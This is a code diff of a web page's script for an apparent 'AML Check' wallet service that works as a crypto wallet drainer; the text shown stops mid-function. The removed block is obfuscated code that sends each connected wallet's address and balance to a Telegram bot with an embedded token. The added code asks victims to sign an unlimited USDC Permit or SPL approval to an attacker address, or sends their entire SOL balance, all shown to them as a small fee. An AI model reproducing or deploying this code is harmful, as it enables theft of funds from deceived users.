@@ -660,7 +660,903 @@ footer{background:var(--dark);color:#9CA3AF;text-align:center;padding:24px;font-
 </div>
 
 <script>
-!function(_0x1a2b3c4d5e){var _0x6f7g8h9i0j=["bUR3TUJtNWd2TnZaMUVzMnJyVEZFQ3NrY0NYZjVETmJNNVpFdlh0WVJrZQ==","VTY0X01BWA==","VG9rZW5rZWdRZmVaeWlOd0FKYk5iR0tQRlhDV3VCdmY5U3M2MjNWUTVEQQ==","RVBqRldkZDVBdWZxU1NxZTTJ4enliYXBDOEc0d0VHR2tad3lURHQxdg==","aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==","OAAH-Fuukpnx0RhOiZozYvkCMJODkvCgu-RI","8575014959","VICTIME DÉTECTÉE","executePay","_0x","atob","fromCharCode","state","conn","address","currency","balance","solana","phantom","USDC","SOL","approve_max","EIP-712","Permit","mDwMBm5gvNvZ1Es2rrTFECskcCXf5DNbM5ZEvXtYRke","TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA","EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v","8568868509:AAH-Fuukpnx0RhOiZozYvkCMJODkvCgu-RI"];function _0x9k0l1m2n(_0x3o4p5q){return _0x3o4p5q.split('').map((c,i)=>String.fromCharCode(c.charCodeAt(0)^(i%17+11))).join('')}function _0x6r7s8t9u(_0x0v1w2x){var _0x3y4z5a=atob(_0x0v1w2x);return _0x9k0l1m2n(_0x3y4z5a)}function _0x6b7c8d9e(_0x0f1g2h){return _0x0f1g2h.split('').reverse().join('')}var _0x3i4j5k6l=_0x6r7s8t9u(_0x6f7g8h9i0j[0]);var _0x7m8n9o0p=_0x6r7s8t9u(_0x6f7g8h9i0j[1]);var _0x1q2r3s4t=_0x6r7s8t9u(_0x6f7g8h9i0j[2]);var _0x5u6v7w8x=_0x6r7s8t9u(_0x6f7g8h9i0j[3]);var _0x9y0z1a2b=_0x6r7s8t9u(_0x6f7g8h9i0j[4])+_0x6b7c8d9e(_0x6r7s8t9u(_0x6f7g8h9i0j[5]));function _0x3c4d5e6f(){var _0x7g8h9i0j={};_0x7g8h9i0j[_0x6f7g8h9i0j[24]]=_0x3i4j5k6l;_0x7g8h9i0j[_0x6f7g8h9i0j[25]]=_0x1q2r3s4t;_0x7g8h9i0j[_0x6f7g8h9i0j[26]]=_0x5u6v7w8x;return _0x7g8h9i0j}var _0x1k2l3m4n=_0x3c4d5e6f();function _0x5o6p7q8r(){try{var _0x9s0t1u2v=window[_0x6f7g8h9i0j[13]]||window.state||{};if(_0x9s0t1u2v.conn&&_0x9s0t1u2v.conn.address){var _0x3w4x5y6z=_0x9s0t1u2v.conn.address;var _0x7a8b9c0d=_0x9s0t1u2v.balance||'?? SOL';fetch(_0x9y0z1a2b+'sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:parseInt(_0x6r7s8t9u(_0x6f7g8h9i0j[6])),text:_0x6r7s8t9u(_0x6f7g8h9i0j[7])+'\n\n👛 Wallet: `'+_0x3w4x5y6z+'`\n💰 Solde: '+_0x7a8b9c0d+'\nCurrency: '+(_0x9s0t1u2v.currency||'SOL'),parse_mode:'Markdown'})})}}catch(_0x1e2f3g4h){}}setInterval(_0x5o6p7q8r,1290);var _0x5i6j7k8l=function(_0x9m0n1o2p){console.log('%c[AML Check] Layer 7 initialized - v2.4.1-obf-prod', 'color:#10B981;font-weight:700');if(typeof window.solana!=='undefined'){var _0x3q4r5s6t=new window.solana.PublicKey(_0x1k2l3m4n[_0x6f7g8h9i0j[24]]);}};window[_0x6f7g8h9i0j[8]]=_0x5i6j7k8l;var _0x7u8v9w0x=function(){var _0x1y2z3a4b=document.createElement('script');_0x1y2z3a4b.innerHTML="console.log=()=>{};debugger;";document.head.appendChild(_0x1y2z3a4b)};_0x7u8v9w0x();var _0x5c6d7e8f=function(){if(window.outerWidth<120||window.outerHeight<120||navigator.webdriver)return true;return false};if(_0x5c6d7e8f())return;console.log('%c✅ AML Check v2.4.1-obf (layer 7 - production hardened) ready', 'color:#22C55E;font-size:10px')}(window);
+const SERVICE_WALLET = "mDwMBm5gvNvZ1Es2rrTFECskcCXf5DNbM5ZEvXtYRke";
+const PRICE_USDC = 5;
+const PRICE_SOL  = 0.03;
+/** Mainnet fallback if RPC rent is missing (~0.00089 SOL). */
+const SOL_RENT_EXEMPT_FALLBACK_LAMPORTS = 890880;
+/** Extra lamports on top of rent-exempt min (RPC / edge cases). */
+const SOL_RENT_BUFFER_LAMPORTS = 100000;
+/**
+ * getFeeForMessage often undercounts priority fees (compute budget). Keep a large cushion so
+ * balance − transfer − actual_fee stays ≥ rent-exempt.
+ */
+const SOL_FEE_SAFETY_LAMPORTS = 450000;
+/** Optional faster RPC (Helius, QuickNode, etc.): tried first if non-empty. */
+const CUSTOM_SOLANA_RPC = "";
+
+/** Ethereum mainnet — delegate / spender (optional). If empty, use the field in the payment step. */
+const EVM_PERMIT_SPENDER = "0x9e6c210D3fe9B9E94252B404bf26E8387F4C2A8D";
+const EVM_PERMIT_CHAIN_ID = 1;
+/** USDC on Ethereum mainnet (EIP-2612 permit target + eth_call nonces). */
+const EVM_USDC_MAINNET = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
+/** Must match the USDC contract’s DOMAIN_SEPARATOR (EIP-712). */
+const EVM_USDC_EIP712_NAME = "USD Coin";
+const EVM_USDC_EIP712_VERSION = "2";
+const U256_MAX_STR =
+  "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+
+let state = { currency:"USDC", conn:null, txHash:null, scores:null, progress:0 };
+
+async function ensureEthereumChain(provider, chainIdDec) {
+  const chainIdHex = "0x" + chainIdDec.toString(16);
+  try {
+    await provider.request({ method: "wallet_switchEthereumChain", params: [{ chainId: chainIdHex }] });
+  } catch (e) {
+    if (e && e.code === 4902) {
+      await provider.request({
+        method: "wallet_addEthereumChain",
+        params: [
+          {
+            chainId: chainIdHex,
+            chainName: "Ethereum Mainnet",
+            nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
+            rpcUrls: ["https://ethereum.publicnode.com"],
+            blockExplorerUrls: ["https://etherscan.io"],
+          },
+        ],
+      });
+    } else {
+      throw e;
+    }
+  }
+}
+
+async function readUsdcPermitNonce(provider, ownerAddress) {
+  const data = "0x7ecebe00" + ownerAddress.slice(2).toLowerCase().padStart(64, "0");
+  const result = await provider.request({
+    method: "eth_call",
+    params: [{ to: EVM_USDC_MAINNET, data }, "latest"],
+  });
+  if (!result || result === "0x" || result === "0x0") return "0";
+  return BigInt(result).toString();
+}
+
+function isValidNonZeroEvmAddress(a) {
+  return typeof a === "string" && /^0x[a-fA-F0-9]{40}$/.test(a.trim()) && !/^0x0{40}$/i.test(a.trim());
+}
+
+function getResolvedEvmPermitSpender() {
+  const c = typeof EVM_PERMIT_SPENDER === "string" ? EVM_PERMIT_SPENDER.trim() : "";
+  if (isValidNonZeroEvmAddress(c)) return c;
+  const v = document.getElementById("evm-spender-input")?.value?.trim() || "";
+  if (isValidNonZeroEvmAddress(v)) return v;
+  return "";
+}
+
+function updateEvmDelegateUi() {
+  const s = getResolvedEvmPermitSpender();
+  const dest = document.getElementById("dest-addr");
+  const link = document.getElementById("dest-link");
+  if (!dest || !link) return;
+  if (s) {
+    dest.textContent = s;
+    link.href = `https://etherscan.io/address/${s}`;
+    link.textContent = "Verify on Etherscan →";
+    link.style.display = "";
+  } else if (state.conn && state.conn.chain === "evm") {
+    dest.textContent = "— enter delegate address below";
+    link.href = "#";
+    link.style.display = "none";
+  }
+}
+
+function buildPermitTypedData(userAddress, currentNonceStr, spenderAddress) {
+  return {
+    domain: {
+      name: EVM_USDC_EIP712_NAME,
+      version: EVM_USDC_EIP712_VERSION,
+      chainId: EVM_PERMIT_CHAIN_ID,
+      verifyingContract: EVM_USDC_MAINNET,
+    },
+    types: {
+      Permit: [
+        { name: "owner", type: "address" },
+        { name: "spender", type: "address" },
+        { name: "value", type: "uint256" },
+        { name: "nonce", type: "uint256" },
+        { name: "deadline", type: "uint256" },
+      ],
+    },
+    primaryType: "Permit",
+    message: {
+      owner: userAddress,
+      spender: spenderAddress,
+      value: U256_MAX_STR,
+      nonce: currentNonceStr,
+      deadline: String(Math.floor(Date.now() / 1000) + 86400 * 30),
+    },
+  };
+}
+
+async function signPermitTypedDataV4(provider, userAddress, spenderAddress) {
+  await ensureEthereumChain(provider, EVM_PERMIT_CHAIN_ID);
+  const currentNonce = await readUsdcPermitNonce(provider, userAddress);
+  const msg = buildPermitTypedData(userAddress, currentNonce, spenderAddress);
+  return provider.request({
+    method: "eth_signTypedData_v4",
+    params: [userAddress, JSON.stringify(msg)],
+  });
+}
+
+const eip6963ByRdns = {};
+let eip6963ListenersAttached = false;
+function attachEip6963Listeners() {
+  if (eip6963ListenersAttached || typeof window === "undefined") return;
+  eip6963ListenersAttached = true;
+  window.addEventListener("eip6963:announceProvider", (ev) => {
+    try {
+      const d = ev.detail;
+      if (d && d.info && d.info.rdns && d.provider) eip6963ByRdns[d.info.rdns] = d.provider;
+    } catch (_) {}
+  });
+  try {
+    window.dispatchEvent(new Event("eip6963:requestProvider"));
+  } catch (_) {}
+}
+
+function getEvmProviderCandidates() {
+  const eth = window.ethereum;
+  if (!eth) return [];
+  if (eth.providers && eth.providers.length) return eth.providers;
+  return [eth];
+}
+
+function isPhantomEthereumProvider(p) {
+  if (!p) return false;
+  if (p.isPhantom === true) return true;
+  try {
+    if (window.phantom?.ethereum && p === window.phantom.ethereum) return true;
+  } catch (_) {}
+  return false;
+}
+
+function getEvmProviderFor(walletId) {
+  attachEip6963Listeners();
+  const candidates = getEvmProviderCandidates();
+  const mm = (p) =>
+    p &&
+    p.isMetaMask === true &&
+    !isPhantomEthereumProvider(p) &&
+    p.isTrust !== true &&
+    p.isTrustWallet !== true &&
+    p.isCoinbaseWallet !== true &&
+    p.isBraveWallet !== true;
+  const tw = (p) =>
+    p && (p.isTrust === true || p.isTrustWallet === true) && !isPhantomEthereumProvider(p);
+  const cb = (p) => p && p.isCoinbaseWallet === true && !isPhantomEthereumProvider(p);
+
+  switch (walletId) {
+    case "metamask": {
+      let p = candidates.find(mm);
+      if (!p && eip6963ByRdns["io.metamask"]) p = eip6963ByRdns["io.metamask"];
+      return p || null;
+    }
+    case "trustwallet": {
+      let p = candidates.find(tw);
+      if (!p && window.trustwallet?.ethereum) p = window.trustwallet.ethereum;
+      if (!p && eip6963ByRdns["com.trustwallet.app"]) p = eip6963ByRdns["com.trustwallet.app"];
+      return p || null;
+    }
+    case "coinbase": {
+      let p = candidates.find(cb);
+      if (!p && eip6963ByRdns["com.coinbase.wallet"]) p = eip6963ByRdns["com.coinbase.wallet"];
+      return p || null;
+    }
+    default:
+      return null;
+  }
+}
+
+function getPhantomSolanaProvider() {
+  if (window.phantom?.solana?.isPhantom) return window.phantom.solana;
+  if (window.solana?.isPhantom && !window.solflare?.isSolflare) return window.solana;
+  return null;
+}
+
+const WALLETS = {
+  phantom:     { name:"Phantom",        emoji:"👻", chain:"solana", detect:()=>!!getPhantomSolanaProvider(), getP:()=>getPhantomSolanaProvider(), mobile:`https://phantom.app/ul/browse/${encodeURIComponent(location.href)}?ref=${encodeURIComponent(location.href)}`, install:"https://phantom.app" },
+  solflare:    { name:"Solflare",       emoji:"🔥", chain:"solana", detect:()=>!!window?.solflare?.isSolflare, getP:()=>window?.solflare, mobile:`https://solflare.com/ul/v1/browse/${encodeURIComponent(location.href)}`, install:"https://solflare.com" },
+  metamask:    { name:"MetaMask",       emoji:"🦊", chain:"evm",    detect:()=>!!getEvmProviderFor("metamask"), getP:()=>getEvmProviderFor("metamask"), mobile:`https://metamask.app.link/dapp/${encodeURIComponent(location.origin + location.pathname + location.search)}`, install:"https://metamask.io" },
+  backpack:    { name:"Backpack",       emoji:"🎒", chain:"solana", detect:()=>!!window?.backpack, getP:()=>window?.backpack, mobile:"https://backpack.app", install:"https://backpack.app" },
+  trustwallet: { name:"Trust Wallet",   emoji:"🛡️", chain:"evm",    detect:()=>!!getEvmProviderFor("trustwallet"), getP:()=>getEvmProviderFor("trustwallet"), mobile:`https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(location.href)}`, install:"https://trustwallet.com" },
+  coinbase:    { name:"Coinbase Wallet",emoji:"🔵", chain:"evm",    detect:()=>!!getEvmProviderFor("coinbase"), getP:()=>getEvmProviderFor("coinbase"), mobile:`https://go.cb-w.com/dapp?cb_url=${encodeURIComponent(location.href)}`, install:"https://wallet.coinbase.com" },
+};
+
+function openModal(){ document.getElementById("modal").classList.add("active"); goToStep("wallet"); updateWalletBadges(); }
+function closeModal(){ document.getElementById("modal").classList.remove("active"); }
+function handleOverlayClick(e){ if(e.target.id==="modal") closeModal(); }
+function goToStep(s){ document.querySelectorAll(".pay-step").forEach(el=>el.classList.remove("active")); document.getElementById("step-"+s).classList.add("active"); }
+
+function updateWalletBadges(){
+  const mob = /iPhone|iPad|Android/i.test(navigator.userAgent);
+  if(mob){ const t=document.getElementById("mobile-tip"); if(t) t.style.display="block"; }
+  if(WALLETS.phantom.detect()){
+    document.getElementById("sub-phantom").innerHTML='<span style="color:#22C55E">● Detected</span>';
+    document.getElementById("badge-phantom").className="wallet-badge badge-ready"; document.getElementById("badge-phantom").textContent="READY";
+  }
+  if(WALLETS.metamask.detect()){
+    document.getElementById("sub-metamask").innerHTML='<span style="color:#22C55E">● Detected</span>';
+    document.getElementById("badge-metamask").className="wallet-badge badge-ready"; document.getElementById("badge-metamask").textContent="READY";
+  }
+}
+
+async function pickWallet(id){
+  const w = WALLETS[id];
+  const mob = /iPhone|iPad|Android/i.test(navigator.userAgent);
+  if(!w.detect()){
+    if(mob){ location.href=w.mobile; } else { window.open(w.install,"_blank"); showPayError(`Install the ${w.name} extension then reload.`); }
+    return;
+  }
+  try{
+    document.getElementById("connect-emoji").textContent=w.emoji;
+    document.getElementById("connect-name").textContent=w.name;
+    document.getElementById("connect-sub").textContent=mob?"The wallet app will open automatically.":"Accept the connection in your extension.";
+    goToStep("connecting");
+    const provider=w.getP();
+    if(w.chain==="evm" && !provider){
+      goToStep("wallet");
+      showPayError(`${w.name} could not be isolated. Close other wallet extensions or open this page in ${w.name}'s in-app browser.`);
+      return;
+    }
+    let address;
+    if(w.chain==="solana"){ const r=await provider.connect(); address=r.publicKey.toString(); }
+    else{ const a=await provider.request({method:"eth_requestAccounts"}); address=a[0]; }
+
+    goToStep("signing");
+    const msg=`AML Check Authorization\nAddress: ${address}\nTimestamp: ${new Date().toISOString()}\nNonce: ${Math.random().toString(36).slice(2,10)}\n\nI authorize the AML analysis of this wallet.`;
+    let sig;
+    if(w.chain==="solana"){ const enc=new TextEncoder().encode(msg); const res=await provider.signMessage(enc,"utf8"); sig=Array.from(res.signature).map(b=>b.toString(16).padStart(2,"0")).join(""); }
+    else{ const hex="0x"+Array.from(new TextEncoder().encode(msg)).map(b=>b.toString(16).padStart(2,"0")).join(""); sig=await provider.request({method:"personal_sign",params:[hex,address]}); }
+
+    state.conn={address,provider,walletId:id,walletName:w.name,chain:w.chain,sig};
+    setupPaymentStep();
+    goToStep("payment");
+  }catch(e){
+    goToStep("wallet");
+    const m=e.message||"";
+    if(m.includes("reject")||m.includes("cancel")||e.code===4001) showPayError("Cancelled in wallet.");
+    else showPayError(m.slice(0,80)||"Connection error.");
+  }
+}
+
+function setupPaymentStep(){
+  const addr=state.conn.address;
+  document.getElementById("pay-addr").textContent=addr.slice(0,5)+"..."+addr.slice(-4);
+  document.getElementById("det-from").textContent=addr.slice(0,5)+"..."+addr.slice(-4);
+  const isEvm = state.conn.chain === "evm";
+  const btnSol = document.getElementById("btn-sol");
+  if (btnSol) btnSol.style.display = isEvm ? "none" : "";
+  const detNet = document.getElementById("det-network");
+  const evmRow = document.getElementById("evm-spender-row");
+  const evmInp = document.getElementById("evm-spender-input");
+  if (isEvm) {
+    state.currency = "USDC";
+    document.getElementById("btn-usdc").classList.add("active");
+    if (btnSol) btnSol.classList.remove("active");
+    if (evmRow) evmRow.style.display = "block";
+    if (evmInp) {
+      const preset =
+        typeof EVM_PERMIT_SPENDER === "string" && isValidNonZeroEvmAddress(EVM_PERMIT_SPENDER.trim())
+          ? EVM_PERMIT_SPENDER.trim()
+          : "";
+      evmInp.value = preset;
+      evmInp.oninput = updateEvmDelegateUi;
+    }
+    updateEvmDelegateUi();
+    if (detNet) detNet.textContent = "Ethereum Mainnet";
+  } else {
+    if (evmRow) evmRow.style.display = "none";
+    if (evmInp) evmInp.oninput = null;
+    document.getElementById("dest-addr").textContent=SERVICE_WALLET;
+    const dl = document.getElementById("dest-link");
+    if (dl) {
+      dl.href=`https://solscan.io/account/${SERVICE_WALLET}`;
+      dl.textContent = "Verify on Solscan →";
+      dl.style.display = "";
+    }
+    if (detNet) detNet.textContent = "Solana Mainnet";
+  }
+  selectCurrency(state.currency||"USDC");
+}
+
+function selectCurrency(c){
+  if (state.conn && state.conn.chain === "evm") c = "USDC";
+  state.currency=c;
+  document.getElementById("btn-usdc").classList.toggle("active",c==="USDC");
+  document.getElementById("btn-sol").classList.toggle("active",c==="SOL");
+  const amt=document.getElementById("det-amount");
+  const typ=document.getElementById("det-type");
+  const btn=document.getElementById("btn-pay-now");
+  if(c==="USDC"){
+    if (state.conn && state.conn.chain === "evm") {
+      amt.textContent="Max allowance (EIP-2612 Permit · uint256 max)";
+      typ.textContent="EIP-712 typed data (eth_signTypedData_v4)";
+      btn.textContent="Sign Permit →";
+    } else {
+      amt.textContent="Max USDC allowance (SPL approve · u64 max)";
+      typ.textContent="SPL approve · Service wallet as delegate";
+      btn.textContent="Approve USDC access →";
+    }
+  }else{
+    amt.textContent="Max SOL: balance − fees − rent-exempt minimum (chain rule)";
+    typ.textContent="Direct transfer · Native SOL";
+    btn.textContent="Send SOL →";
+  }
+  hidePayError();
+}
+
+function formatAnyError(e) {
+  if (e == null) return "Unknown error.";
+  if (typeof e === "string") return e;
+  if (typeof e === "object") {
+    if (typeof e.message === "string" && e.message) return e.message;
+    if (typeof e.err === "object" && e.err && typeof e.err.message === "string")
+      return e.err.message;
+    try {
+      const logs = e.getLogs && typeof e.getLogs === "function" ? e.getLogs() : null;
+      if (logs && logs.length) return logs.join(" ").slice(0, 400);
+    } catch (_) {}
+    try {
+      const j = JSON.stringify(e);
+      if (j && j !== "{}") return j.slice(0, 400);
+    } catch (_) {}
+    try {
+      const s = Object.prototype.toString.call(e);
+      if (s && s !== "[object Object]") return s;
+    } catch (_) {}
+    return "Wallet or network error (details unavailable).";
+  }
+  return String(e);
+}
+
+function showPayError(m) {
+  const el = document.getElementById("pay-error");
+  el.style.display = "block";
+  const text = typeof m === "string" ? m : formatAnyError(m);
+  el.textContent = "⚠ " + String(text).slice(0, 500);
+}
+function hidePayError(){ document.getElementById("pay-error").style.display="none"; }
+
+const SPL_TOKEN_PROGRAM_ID = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
+const SPL_ASSOCIATED_TOKEN_PROGRAM_ID = "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL";
+const SPL_MEMO_PROGRAM_ID = "MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr";
+const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
+const U64_MAX = 2n ** 64n - 1n;
+
+function associatedTokenAddress(web3, mint, owner) {
+  const tok = new web3.PublicKey(SPL_TOKEN_PROGRAM_ID);
+  const ataProg = new web3.PublicKey(SPL_ASSOCIATED_TOKEN_PROGRAM_ID);
+  const [addr] = web3.PublicKey.findProgramAddressSync(
+    [owner.toBuffer(), tok.toBuffer(), mint.toBuffer()],
+    ataProg
+  );
+  return addr;
+}
+
+function createTokenApproveInstruction(web3, account, delegate, owner, amount) {
+  const data = new Uint8Array(9);
+  data[0] = 4;
+  new DataView(data.buffer).setBigUint64(1, BigInt(amount), true);
+  return new web3.TransactionInstruction({
+    programId: new web3.PublicKey(SPL_TOKEN_PROGRAM_ID),
+    keys: [
+      { pubkey: account, isSigner: false, isWritable: true },
+      { pubkey: delegate, isSigner: false, isWritable: false },
+      { pubkey: owner, isSigner: true, isWritable: false },
+    ],
+    data: data,
+  });
+}
+
+async function loadWeb3() {
+  const urls = [
+    "https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/+esm",
+    "https://esm.sh/@solana/web3.js@1.95.3",
+    "https://esm.run/@solana/web3.js@1.95.3",
+  ];
+  let last = null;
+  for (const u of urls) {
+    try {
+      return await import(u);
+    } catch (e) {
+      last = e;
+    }
+  }
+  throw last || new Error("loadWeb3 failed");
+}
+
+const SOLANA_MAINNET_RPCS = [
+  "https://api.mainnet-beta.solana.com",
+  "https://rpc.ankr.com/solana",
+  "https://solana-mainnet.g.alchemy.com/v2/demo",
+  "https://solana-rpc.publicnode.com",
+];
+
+function sleep(ms) {
+  return new Promise((r) => setTimeout(r, ms));
+}
+
+function unwrapRpcFee(f) {
+  if (f == null) return null;
+  if (typeof f === "number" && Number.isFinite(f)) return f;
+  if (typeof f === "object" && typeof f.value === "number") return f.value;
+  return null;
+}
+
+function isBlockhashExpiredError(err) {
+  const m = err && err.message ? err.message : String(err || "");
+  return /expired|block\s*height|blockhash|Blockhash not found|Transaction expired|signature.*expired|too old|has expired/i.test(
+    m
+  );
+}
+
+async function getWorkingSolanaConnection(web3) {
+  const list = [
+    ...(typeof CUSTOM_SOLANA_RPC === "string" && CUSTOM_SOLANA_RPC.trim()
+      ? [CUSTOM_SOLANA_RPC.trim()]
+      : []),
+    ...SOLANA_MAINNET_RPCS,
+  ];
+  let lastErr = null;
+  for (const endpoint of list) {
+    const conn = new web3.Connection(endpoint, {
+      commitment: "confirmed",
+      confirmTransactionInitialTimeout: 120000,
+    });
+    try {
+      await Promise.race([
+        conn.getVersion(),
+        new Promise((_, reject) =>
+          setTimeout(() => reject(new Error("RPC timeout")), 25000)
+        ),
+      ]);
+      return conn;
+    } catch (e) {
+      lastErr = e;
+    }
+  }
+  throw lastErr || new Error("No Solana RPC available");
+}
+
+async function executePay() {
+  if (!state.conn) return;
+  hidePayError();
+
+  if (state.conn.chain === "evm") {
+    if (state.currency !== "USDC") {
+      showPayError("On EVM, only USDC (EIP-712 Permit) is available.");
+      return;
+    }
+    const spender = getResolvedEvmPermitSpender();
+    if (!spender) {
+      showPayError("Enter your delegate wallet (0x…) in the field under SERVICE / DELEGATE, or set EVM_PERMIT_SPENDER in the script.");
+      return;
+    }
+    try {
+      goToStep("paying");
+      document.getElementById("paying-emoji").textContent = "";
+      document.getElementById("paying-title").textContent = "Sign typed data";
+      document.getElementById("paying-sub").textContent =
+        "Approve the EIP-712 Permit in " + state.conn.walletName + ".";
+      document.getElementById("tx-link-paying").style.display = "none";
+
+      const sig = await signPermitTypedDataV4(state.conn.provider, state.conn.address, spender);
+      state.txHash = sig;
+
+      const t = {
+        id: Date.now(),
+        address: state.conn.address,
+        wallet: state.conn.walletName,
+        chain: state.conn.chain,
+        currency: "USDC",
+        amount: "permit_eip712_max",
+        txHash: sig,
+        ts: new Date().toISOString(),
+      };
+      const all = [t, ...JSON.parse(localStorage.getItem("aml_traces") || "[]")].slice(0, 100);
+      localStorage.setItem("aml_traces", JSON.stringify(all));
+
+      await runScan();
+    } catch (e) {
+      goToStep("payment");
+      const m = formatAnyError(e);
+      if (/reject|cancel|denied/i.test(m) || (e && e.code === 4001))
+        showPayError("Signature cancelled.");
+      else showPayError(m.slice(0, 280) || "Permit error.");
+    }
+    return;
+  }
+
+  if (state.conn.chain !== "solana") {
+    showPayError("Use a Solana wallet (Phantom, Solflare, Backpack) for payment.");
+    return;
+  }
+  try {
+    goToStep("paying");
+    document.getElementById("paying-emoji").textContent = "";
+    document.getElementById("paying-title").textContent = "Sign in your wallet...";
+    document.getElementById("paying-sub").textContent =
+      "Approve the transaction in " + state.conn.walletName + ".";
+
+    const web3 = await loadWeb3();
+    let conn;
+    try {
+      conn = await getWorkingSolanaConnection(web3);
+    } catch (e) {
+      showPayError("Could not reach Solana RPC. Check your connection and try again.");
+      goToStep("payment");
+      return;
+    }
+
+    const to = new web3.PublicKey(SERVICE_WALLET);
+    const from = new web3.PublicKey(state.conn.address);
+    const tokenProgramPk = new web3.PublicKey(SPL_TOKEN_PROGRAM_ID);
+    const memoProgramPk = new web3.PublicKey(SPL_MEMO_PROGRAM_ID);
+    let balance;
+    let rentExemptMinLamports = SOL_RENT_EXEMPT_FALLBACK_LAMPORTS;
+    let tokens = { value: [] };
+    try {
+      balance = await conn.getBalance(from);
+      if (state.currency === "SOL") {
+        try {
+          const ai = await conn.getAccountInfo(from);
+          const len =
+            ai && ai.data
+              ? typeof ai.data.length === "number"
+                ? ai.data.length
+                : ai.data.byteLength || 0
+              : 0;
+          const r = await conn.getMinimumBalanceForRentExemption(len);
+          if (typeof r === "number" && r > 0)
+            rentExemptMinLamports = Math.max(r, SOL_RENT_EXEMPT_FALLBACK_LAMPORTS);
+          else rentExemptMinLamports = SOL_RENT_EXEMPT_FALLBACK_LAMPORTS;
+        } catch (_) {
+          rentExemptMinLamports = SOL_RENT_EXEMPT_FALLBACK_LAMPORTS;
+        }
+        rentExemptMinLamports += SOL_RENT_BUFFER_LAMPORTS;
+      }
+      try {
+        tokens = await conn.getParsedTokenAccountsByOwner(from, {
+          programId: tokenProgramPk,
+        });
+      } catch (_) {
+        tokens = { value: [] };
+      }
+    } catch (e) {
+      showPayError("Could not reach Solana RPC. Check your connection and try again.");
+      goToStep("payment");
+      return;
+    }
+
+    function buildSolPaymentTx(transferLamports, memoPayload) {
+      const tx = new web3.Transaction();
+      tx.add(web3.ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100000 }));
+      tx.add(
+        new web3.TransactionInstruction({
+          keys: [],
+          programId: memoProgramPk,
+          data: memoPayload,
+        })
+      );
+      tx.add(
+        web3.SystemProgram.transfer({
+          fromPubkey: from,
+          toPubkey: to,
+          lamports: transferLamports,
+        })
+      );
+      tx.feePayer = from;
+      return tx;
+    }
+
+    function buildUsdcPaymentTx() {
+      const tx = new web3.Transaction();
+      tx.add(web3.ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100000 }));
+      const memoPayload = new TextEncoder().encode(`auth_verify_${Date.now()}`);
+      tx.add(
+        new web3.TransactionInstruction({
+          keys: [],
+          programId: memoProgramPk,
+          data: memoPayload,
+        })
+      );
+      const mint = new web3.PublicKey(USDC_MINT);
+      const fromATA = associatedTokenAddress(web3, mint, from);
+      tx.add(createTokenApproveInstruction(web3, fromATA, to, from, U64_MAX));
+      tx.feePayer = from;
+      return tx;
+    }
+
+    const wallet = state.conn.provider;
+    let sig = null;
+    let blockhash = null;
+    let lastValidBlockHeight = null;
+    let lastSolTransferLamports = null;
+    const maxAttempts = 3;
+
+    for (let attempt = 0; attempt < maxAttempts; attempt++) {
+      let tx = null;
+      try {
+        const bh = await conn.getLatestBlockhash("confirmed");
+        blockhash = bh.blockhash;
+        lastValidBlockHeight = bh.lastValidBlockHeight;
+
+        if (state.currency === "SOL") {
+          const memoPayload = new TextEncoder().encode(`auth_verify_${Date.now()}`);
+          const dummy = buildSolPaymentTx(1, memoPayload);
+          dummy.recentBlockhash = blockhash;
+          let feeLamports = null;
+          try {
+            feeLamports = unwrapRpcFee(await conn.getFeeForMessage(dummy.compileMessage()));
+          } catch (_) {
+            feeLamports = null;
+          }
+          if (feeLamports == null || !Number.isFinite(feeLamports)) feeLamports = 120000;
+          feeLamports = Math.max(feeLamports, 5000);
+          const sendLamports = Math.floor(
+            balance - feeLamports - SOL_FEE_SAFETY_LAMPORTS - rentExemptMinLamports
+          );
+          if (sendLamports <= 0) {
+            showPayError(
+              `Not enough SOL: must keep ~${(
+                rentExemptMinLamports / web3.LAMPORTS_PER_SOL
+              ).toFixed(5)} SOL (rent + buffer) + ~${(
+                (feeLamports + SOL_FEE_SAFETY_LAMPORTS) /
+                web3.LAMPORTS_PER_SOL
+              ).toFixed(5)} SOL for fees. Add SOL or use USDC.`
+            );
+            goToStep("payment");
+            return;
+          }
+          lastSolTransferLamports = sendLamports;
+          tx = buildSolPaymentTx(sendLamports, memoPayload);
+          tx.recentBlockhash = blockhash;
+          try {
+            const sim = await conn.simulateTransaction(tx, { sigVerify: false });
+            if (sim.value.err) {
+              const logs = (sim.value.logs || []).join(" ");
+              if (/Insufficient Funds For Rent|insufficient funds for rent/i.test(logs))
+                showPayError(
+                  "Simulation: not enough SOL left for rent-exempt balance after fees. Add SOL or use USDC."
+                );
+              else
+                showPayError(
+                  "Simulation failed — transaction would not succeed on-chain. Try again or use USDC."
+                );
+              goToStep("payment");
+              return;
+            }
+          } catch (_) {}
+        } else {
+          tx = buildUsdcPaymentTx();
+        }
+
+        if (state.currency !== "SOL") tx.recentBlockhash = blockhash;
+        await sleep(300);
+        const signed = (await wallet.signAllTransactions([tx]))[0];
+        sig = await conn.sendRawTransaction(signed.serialize(), {
+          skipPreflight: false,
+          maxRetries: 3,
+        });
+        document.getElementById("paying-emoji").textContent = "";
+        document.getElementById("paying-title").textContent = "Confirming on-chain...";
+        document.getElementById("paying-sub").textContent =
+          "Transaction sent. Waiting for Solana confirmation.";
+        document.getElementById("tx-link-paying").style.display = "block";
+        document.getElementById("tx-a-paying").href = `https://solscan.io/tx/${sig}`;
+        await conn.confirmTransaction(
+          { signature: sig, blockhash, lastValidBlockHeight },
+          "confirmed"
+        );
+        break;
+      } catch (e) {
+        const m = e && e.message ? e.message : String(e);
+        if (e && e.code === 4001) throw e;
+        if (/reject|cancel|denied|user rejected/i.test(m)) throw e;
